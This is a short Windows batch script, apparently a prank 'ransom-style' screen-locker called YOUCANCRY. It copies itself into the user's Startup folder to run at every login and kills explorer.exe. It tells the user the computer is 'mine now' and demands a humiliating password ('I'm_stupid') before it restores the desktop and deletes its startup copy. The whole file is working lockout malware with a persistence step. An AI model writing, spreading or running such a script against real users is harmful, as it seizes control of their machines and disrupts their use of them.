@echo off

cls
color 47
if exist "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\YOUCANCRY.bat" goto b
copy "YOUCANCRY.bat" "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:b
taskkill /f /im explorer.exe
title YOUCANCRY
cls
echo YOUCANCRY 1.1.0
echo Hello! Your computer is  mine now! Hmm.. Exactly what this YOUCANCRY is!

echo you can try somthing with alt, but if you Professional, I think you already try it.
echo though, I recommend guess this password!
echo if you wrong 5 times, I will give you a hint!
set what=0
:a
set /p passwd=password:
if %passwd%==I'm_stupid goto case2

:case1
cls
set /a what=%what%+1
if %what%==5 goto case3
echo try again
goto a

:case2
cls
echo You said you were stupid!
if exist "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
del "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\YOUCANCRY.bat" )
pause
start C:\windows\explorer.exe
goto case4

:case3
echo okey...
echo I will give you a hint
start "" https://github.com/firecomputer/YOUCANCRY
goto a

:case4

